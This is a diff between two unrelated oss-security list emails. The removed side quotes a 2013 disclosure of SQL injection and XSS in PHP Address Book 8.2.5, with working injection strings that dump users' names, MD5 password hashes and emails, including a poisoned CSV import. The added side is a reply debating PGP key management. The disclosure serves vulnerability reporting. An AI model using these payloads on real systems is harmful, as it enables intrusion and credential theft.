@@ -1,142 +1,86 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2013/05/11/1
-Message-ID: <518DA98A.1050007@redhat.com>
-Date: Fri, 10 May 2013 20:14:34 -0600
-From: Kurt Seifried <kseifried@...hat.com>
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2013/04/26/1
+Message-ID: <20130426052424.GD23082@nef.pbox.org>
+Date: Fri, 26 Apr 2013 07:24:24 +0200
+From: Alistair Crooks <agc@...src.org>
 To: oss-security@...ts.openwall.com
-CC: Doraemon Sk8ers <doraemon.sk8ers@...il.com>, Henri Salo <henri@...v.fi>
-Subject: Re: Multiple vulnerabilities in PHP Address Book v8.2.5
+Subject: Re: upstream source code authenticity checking
 Content-Type: text/plain; charset=utf-8
 
------BEGIN PGP SIGNED MESSAGE-----
-Hash: SHA1
-
-On 05/10/2013 03:14 AM, Doraemon Sk8ers wrote:
-> Hi Henri,
+On Thu, Apr 25, 2013 at 08:55:00AM -0400, Josh Bressers wrote:
+> > 
+> > So, all in all, what you have is a digest, signed by someone who knows
+> > the key, or who has access to the creds (if any) for the key, or who
+> > has found out the key creds, albeit with timestamp info for when the
+> > signature took place.
+> > 
+> > I'm not sure what using PGP gains us?
+> > 
 > 
-> CVE-2013-1748 #1 does seems to be similar with CVE-2008-2565, the
-> only difference is the increase in the number of columns To our
-> knowledge, CVE-2013-1748 #2 and #3 has not been published before
-
-So can we confirm that CVE-2013-1748 #1 is duplicate of CVE-2008-2565
-and that #2 and #3 are new? if so can we just use CVE-2013-1748 for #2
-and #3 Steve?
-
-> Regards Team Doraemon.Sk8ers http://doraemondroids.wikispaces.com/
+> I'm going to take a hard stance against this statement and use it as my
+> soapbox for a bit here.
 > 
-> On Wed, Apr 17, 2013 at 10:27 PM, Henri Salo <henri@...v.fi>
-> wrote:
+> This attitude is really dangerous in the world of security (but it has
+> infected our universe). Security is hard, we all know that, but I think we
+> like to draw a line at 100% and say "it's this or nothing". No, PGP isn't
+> perfect, but it gains us a ton. It's a way we can say "this was signed by
+> someone with the key". Did the bad guy have they key? Maybe, the goal isn't
+> to get to 100%, it's to make the job of an attacker harder, which this
+> would do.
 > 
->> Hello,
->> 
->> I believe CVE-2013-1748 #1 is duplicate of CVE-2008-2565 as per
->> OSVDB[1]. As far as I know most of security vulnerabilities
->> reported to this project haven't been fixed. Haven't verified
->> this detail. What php-addressbook project would need is patches
->> to fix all issues you can find. Finding vulnerabilities is easy
->> - fixing in upstream is not. I can help you if you are willing to
->> write patches. Takes hour or two :)
->> 
->> 1: http://osvdb.org/45965
->> 
->> --- Henri Salo
->> 
->> On Wed, Apr 17, 2013 at 11:14:27AM +0800, Doraemon Sk8ers wrote:
->>> There is a SQL injection vulnerability and reflected XSS in
->>> Simple PHP Address Book v8.2.5. The 2 vulnerabilities had been
->>> assigned the CVE identifier CVE-2013-1748 (SQLi) &
->>> CVE-2013-1749 (XSS) respectively.
->>> 
->>> # Software Link:
->>> http://sourceforge.net/projects/php-addressbook/ # Version:
->>> v8.2.5 # Tested on: v8.2.5 # CVE : CVE-2013-1748 (SQLi) &
->>> CVE-2013-1749 (XSS)
->>> 
->>> 
->>> Details: ----------- * * *CVE-2013-1748 (SQLi)*
->>> 
->>> We have discovered 3 pages which are prone to SQL Injection
->>> 
->>> 1.    /view.php?id=1 The "id" parameter is vulnerable to SQL
->>> injection Injection Vector: /view.php?id=-1' union select
->>> '1','2','3','4',(select username from users limit 1),(select
->>> md5_pass from users limit 1),(select email from users limit
->> 1),'8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41
->>>
->> 
-This injection vector will dump the username, md5 password and email
->>> of the first user in the user table onto the page itself
->>> 
->>> 2.    /edit.php Most of the fields on this page are vulnerable
->>> to SQL injection Injection Vector (inclusive of quotes): 
->>> '+(select ASCII(SUBSTRING((SELECT md5_pass from users limit
->>> 1),
->> 1)))+'
->>> This will dump out the ASCII value of the 1st character of the
->>> md5 password of the first user
->>> 
->>> 3.    /import.php The same injection vulnerability as Point 2
->>> above is also present in the import function Using the same
->>> injection vector, saved in a csv file '+(select
->>> ASCII(SUBSTRING((SELECT md5_pass from users limit 1),
->> 1)))+'
->>> Similarly, this injection vector will dump out the ASCII value
->>> of the 1st character of the md5 password of the first user
->>> 
->>> The original input csv sample looks like this "Last
->>> name";"First 
->>> name";"Birthday";"Address";"ZIP";"City";"Home";"Mobile";"E-mail
->>>
->>> 
-home";"Work";"Fax";"E-mail office";"Second address";"Second phone"
->>> "thelastname";"thefirstname";"13.09.1951";"Street";"1234";"city,
->>>
->>> 
-Country";"+1 123 456 789";"+2 345 678 910";"first.last@...l1.com";"+3
->>> 456 789 101";"+4 567 897 011";"first.last@...l2.net";"second
->>> street, 1234 secondcity, secondcountry";"+5 678 910 111"
->>> 
->>> The injected csv with the injected vectors looks like this 
->>> "Last name";"First 
->>> name";"Birthday";"Address";"ZIP";"City";"Home";"Mobile";"E-mail
->>>
->>> 
-home";"Work";"Fax";"E-mail office";"Second address";"Second phone"
->>> "";"injectedthrucsv";"13.09.1951";"'+(select
->>> ASCII(SUBSTRING((SELECT md5_pass from users limit 1),
->>> 1)))+'";"";"city, Country";"+1 123 456 789";"+2 345 678
->>> 910";"first.last@...l1.com";"+3 456 789 101";"+4 567 897
->>> 011";"first.last@...l2.net";"second street, 1234 secondcity, 
->>> secondcountry";"+5 678 910 111"
->> <snip>
->> 
->> -----BEGIN PGP SIGNATURE----- Version: GnuPG v1.4.10 (GNU/Linux)
->> 
->> iEYEARECAAYFAlFusWEACgkQXf6hBi6kbk+zewCgv1NZPnNJ+oullyyNGCZIiZDE 
->> yVgAn0B3sIciT45IzHOQgAhZpEl+ul0p =c0zL -----END PGP
->> SIGNATURE-----
->> 
->> 
-> 
+> There is no system that exists in this instance that is 100% safe. What we
+> need to do isn't talk about how useless PGP is (which it isn't), we need to
+> talk about what's right about it and give advice so people understand how
+> to avoid silly mistakes.
 
+I think you misunderstand me. The mail I sent out was to warn against the
+magic "it's signed, so it's gospel" myth by pointing out the problems of
+key management. I have written my own pgp/rfc4880 implementation, and talked
+about it at EuroBSDcons in 2009, 2010, 2011. I would hardly do that if i
+thought PGP was "useless". It's a bit disappointing that my advice (in pointing
+out ways that PGP can be worked around in order to diminish integrity and
+security) was categorised as an attack on PGP itself - I shall take that as
+a reminder that I should be more clear in what I write.
+ 
+> A great example is to use a smart card. If a project is using a smart card,
+> and tells us they're using a smart card, that would be helpful in letting
+> us know their signatures are probably trustworthy. We would certainly know
+> their signatures are more trustworthy than a project who uses a private key
+> shared between 10 people. Is the smart card a perfect solution? Certainly
+> not, but it's better than not using a smart card. How many non security
+> people really understand this? How many of us have tried to explain it in a
+> calm and understanding manner?
 
-- -- 
-Kurt Seifried Red Hat Security Response Team (SRT)
-PGP: 0x5E267993 A90B F995 7350 148F 66BF 7554 160D 4553 5E26 7993
------BEGIN PGP SIGNATURE-----
-Version: GnuPG v1.4.13 (GNU/Linux)
+I fail to see how "using a smartcard" automatically leads to
+signatures "probably being trustworthy".  Lest I'm misunderstood again
+- 2 factor authentication is good, yes, but you need to look at the
+set up holistically. If an unauthorised third party has root on the server
+being used to control the 2 factor auth, then you are in a worse
+position than not using 2 factor auth.  Consider the SSL business
+model where the CAs have considerable motivation not to disclose
+intrusions, mis-issued certs and other such items.  In the case of
+Diginotar, they were put out of business.
 
-iQIcBAEBAgAGBQJRjamKAAoJEBYNRVNeJnmT+JkP/i0wU2O3TQWOmwPjUMUdFaq0
-Y7R1NjaNXkoFW5Djj4oPxyVaQCl6DqrsYg6/Un7/0DhBGQ9GBw3i9/AYXHkQCj/k
-lfC78SGQUpoO5Lniuy1uyuvf92GlL+0oIX8S/I1RVCmDNyfi9LCQCy7rsKdVG6Re
-L9/db4vbsM/ppVcdOHwAXyR7zZoOJZbC1zOlHECJnc7gHBpbKJYGofGue/9LaTUD
-5oySftGo6gsA1MWxcW/NaBStBt9XDuGSSo8YQO2cMi8CF5YhGY03y9l+EbhaOm8n
-MQe+fIEKk+r5H6gf7mw7SLcUU0zYgJhNmIo1b9hZyT+SWOzQk+GV12en0OwNpyKL
-hm37RlM7HJwR+ocR5F/Dr31d0S8udZMawdXLbT7qU3J/O0OWnQgQeTrwE9zd+toV
-cwRElqVTFpTiqGHCfv8vq2LC1oXgSHfcGyoT5dp1u19lH0foLA+xGSse6yJrlu2d
-PudNnaLs/IU4vEjOfjT9qURyw6z6rl5kM1Y5TsAxjGZ33BCxqNmo0cZpAY+shfId
-xv3K+U47xPzet2I4cmUYc8NryEpYa7MFGGUpHfoJdx+8rpnYuJoMjVSdD+d7bdPN
-X4nacE6Q7Pg2NlWIkYzIA4SnOTnQlBqX5VlZbxi15wrgHwgJvb+cRjAATG9Q1Q+x
-txg9coELprnCwdr/5zZJ
-=a2cz
------END PGP SIGNATURE-----
+And before people start telling me to get real, I'll point out that
+most enterprises these days have a basic assumption that they have
+been hacked, and are building "more secure" islands to try to fence
+intrusions in.
+ 
+> This is Red Hat's goal here. We want to help folks understand what some
+> easy wins are. Security is hard, it will never be 100%. I'd rather see us
+> all working together to improve what we can.
+
+I'm all for rasing the bar. My previous mail was intended to make people
+think about the processes and procedures behind key management - I'm sorry
+it failed so dismally. I shall attempt to do better next time.
+
+If Red Hat document their key management procedures, that would be
+great.  Having these procedures audited would be superb (albeit a very
+brave step), and I would be very impressed if they did.  I'm not sure
+security is as hard as you're making out, although I'm aware that
+there's no silver bullet.
+
+Onwards and upwards...
+
+Regards,
+Alistair
